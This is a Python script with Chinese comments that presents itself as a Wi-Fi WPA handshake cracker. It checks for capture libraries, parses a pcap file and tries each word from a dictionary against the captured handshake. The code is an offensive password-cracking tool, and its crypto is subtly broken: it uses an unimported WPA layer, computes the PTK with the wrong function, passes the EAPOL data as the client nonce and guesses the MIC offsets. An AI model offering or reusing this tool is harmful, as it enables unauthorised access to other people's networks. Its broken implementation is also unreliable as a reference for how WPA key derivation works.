import hashlib  # 导入哈希库，用于密码哈希和PTK计算
import hmac  # 导入HMAC库，用于MIC验证
import os  # 导入操作系统相关功能，用于路径检查和其他操作系统交互
import platform  # 导入平台相关功能，用于检测操作系统类型
import subprocess  # 导入子进程管理功能，用于执行系统命令
import sys  # 导入系统相关功能，用于退出程序

try:
    from scapy.all import rdpcap, EAPOL, Dot11Beacon, Dot11Elt, Raw  # 尝试导入Scapy库
except ImportError:
    scapy_imported = False
else:
    scapy_imported = True


def check_windows_dependencies():
    """
    检查Windows系统是否安装了Npcap和Scapy
    """
    if not scapy_imported:
        return False  # 如果Scapy未导入成功，返回False
    npcap_path = "C:\\Program Files\\Npcap"  # 定义Npcap的默认安装路径
    if not os.path.exists(npcap_path):  # 检查Npcap是否安装
        return False  # 如果Npcap未安装，返回False
    print("[+] 已检测到 Npcap 和 Scapy")  # 打印确认信息
    return True  # 返回True表示依赖项已安装


def check_linux_dependencies():
    """
    检查Linux系统是否安装了libpcap和Scapy
    """
    if not scapy_imported:
        return False  # 如果Scapy未导入成功，返回False
    try:
        subprocess.check_call(['which', 'tcpdump'])  # 检查是否安装了libpcap（通过tcpdump）
        print("[+] 已检测到 libpcap 和 Scapy")  # 打印确认信息
        return True  # 返回True表示依赖项已安装
    except subprocess.CalledProcessError:
        return False  # 如果libpcap未安装，返回False


def install_dependencies():
    """
    根据操作系统安装相应的依赖项
    """
    if platform.system() == 'Windows':  # 如果是Windows系统
        print("需要安装Npcap。请访问 https://nmap.org/npcap/ 进行下载和安装。")
    elif platform.system() == 'Linux':  # 如果是Linux系统
        print("请手动安装依赖项，命令如下：")
        print("sudo apt-get update")
        print("sudo apt-get install -y python3 python3-pip python3-dev libpcap-dev git")
        print("pip install scapy")
    else:
        print("不支持的操作系统")  # 如果操作系统不支持，提示用户


def checkTheOperatingSystemAndDependencies():
    """
    主函数：检测操作系统和依赖项，并执行主要功能
    """
    os_type = platform.system()  # 获取当前操作系统类型
    print(f"检测到的操作系统: {os_type}")  # 打印操作系统类型

    if os_type == 'Windows':  # 如果是Windows系统
        if not check_windows_dependencies():  # 检查Windows依赖项
            print("[-] 未检测到 Npcap 或 Scapy")  # 打印依赖项缺失信息
            install_dependencies()  # 提示用户手动安装依赖项
            sys.exit(1)  # 提示用户手动安装后退出
    elif os_type == 'Linux':  # 如果是Linux系统
        if not check_linux_dependencies():  # 检查Linux依赖项
            print("[-] 未检测到 libpcap 或 Scapy")  # 打印依赖项缺失信息
            install_dependencies()  # 提示用户手动安装依赖项
            sys.exit(1)  # 提示用户手动安装后退出
    else:
        print("不支持的操作系统")  # 如果操作系统不支持，提示用户
        sys.exit(1)  # 退出程序


def parse_handshake(pcap_file):
    """
    解析握手包文件，提取必要的信息
    """
    try:
        packets = rdpcap(pcap_file)  # 读取pcap文件
    except FileNotFoundError:
        print(f"[-] 文件未找到: {pcap_file}")  # 文件未找到时提示错误
        return None
    except Exception as e:
        print(f"[-] 读取文件时出错: {e}")  # 读取文件时出现其他错误时提示错误
        return None

    ssid = None  # 初始化SSID变量
    ap_mac = None  # 初始化AP MAC地址变量
    client_mac = None  # 初始化客户端MAC地址变量
    anonce = None  # 初始化ANonce变量
    eapol = None  # 初始化EAPOL数据变量

    for pkt in packets:  # 遍历数据包
        if pkt.haslayer(EAPOL):  # 检查数据包是否包含EAPOL层
            if not ssid and pkt.haslayer(Dot11Beacon):  # 如果SSID未获取且数据包包含Beacon层
                ssid = pkt[Dot11Elt].info.decode()  # 提取SSID
            if not ap_mac:
                ap_mac = pkt.addr2.replace(':', '')  # 提取并格式化AP MAC地址
            if not client_mac:
                client_mac = pkt.addr1.replace(':', '')  # 提取并格式化客户端MAC地址

            if not anonce and pkt.haslayer(Dot11WPA):  # 如果ANonce未获取且数据包包含WPA层
                anonce = pkt[Dot11WPA].nonce  # 提取ANonce
            if not eapol:
                eapol = pkt[Raw].load  # 提取EAPOL数据

    if not all([ssid, ap_mac, client_mac, anonce, eapol]):  # 检查是否所有必要信息都已提取
        print("[-] 无法提取握手信息")  # 提示无法提取握手信息
        return None

    return ssid, ap_mac, client_mac, anonce, eapol  # 返回提取的信息


def pbkdf2(passphrase, ssid, iterations=4096, dklen=32):
    """
    使用PBKDF2算法生成PMK
    """
    from hashlib import pbkdf2_hmac  # 导入pbkdf2_hmac函数
    return pbkdf2_hmac('sha1', passphrase.encode('ascii'), ssid.encode('ascii'), iterations, dklen)  # 生成并返回PMK


def calculate_ptk(pmk, ap_mac, client_mac, anonce, snonce):
    """
    计算PTK
    """
    b = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)  # 组合B值
    ptk = hashlib.pbkdf2_hmac('sha1', pmk, b, 4096, 64)  # 计算PTK
    return ptk  # 返回PTK


def verify_mic(ptk, eapol, mic):
    """
    验证MIC
    """
    mic_to_test = hmac.new(ptk[0:16], eapol[0:77] + b'\x00' * 16 + eapol[93:], hashlib.sha1).hexdigest()[:32]  # 计算MIC
    return mic_to_test == mic  # 返回MIC验证结果


def crack_wifi_handshake():
    """
    破解WiFi握手包，尝试找到正确的密码
    """
    checkTheOperatingSystemAndDependencies()
    os_type = platform.system()  # 获取当前操作系统类型
    if os_type == 'Windows':
        example_path = "C:\\Users\\YourUsername\\capture.pcap"  # 示例路径
        example_wordlist = "C:\\Users\\YourUsername\\wordlist.txt"  # 示例密码字典路径
    elif os_type == 'Linux':
        example_path = "/home/yourusername/capture.pcap"  # 示例路径
        example_wordlist = "/home/yourusername/wordlist.txt"  # 示例密码字典路径
    else:
        print("不支持的操作系统")  # 如果操作系统不支持，提示用户
        sys.exit(1)  # 退出程序

    print("请将实际的握手包文件和密码字典替换为以下示例路径:")
    print(f"握手包文件路径: {example_path}")
    print(f"密码字典路径: {example_wordlist}")

    pcap_file = input("\n请输入握手包文件路径: ").strip()  # 提示用户输入握手包文件路径
    wordlist = input("请输入密码字典路径: ").strip()  # 提示用户输入密码字典路径

    # 解析握手包文件
    handshake_info = parse_handshake(pcap_file)
    if not handshake_info:
        print("解析握手包文件失败，请检查文件路径是否正确并重试。")
        sys.exit(1)

    ssid, ap_mac, client_mac, anonce, eapol = handshake_info

    print("\n开始破解...")
    try:
        with open(wordlist, 'r', encoding='latin-1') as f:  # 打开密码字典文件
            for line in f.readlines():  # 逐行读取密码
                passphrase = line.strip()  # 去掉首尾空格和换行符
                pmk = pbkdf2(passphrase, ssid)  # 使用密码生成PMK
                ptk = calculate_ptk(pmk, ap_mac, client_mac, anonce, eapol)  # 计算PTK
                if verify_mic(ptk, eapol, eapol[-16:].hex()):  # 验证MIC
                    print(f"\n[+] 握手包已成功破解!")
                    print(f"[+] SSID: {ssid}")
                    print(f"[+] 密码: {passphrase}")
                    sys.exit(0)
                else:
                    print(f"[-] 未找到匹配密码: {passphrase}")  # 打印未找到匹配密码信息
    except FileNotFoundError:
        print(f"[-] 文件未找到: {wordlist}")  # 如果文件未找到，打印未找到文件信息
        sys.exit(1)

    print("\n未找到适合的密码。")  # 如果没有找到合适的密码，打印未找到密码信息
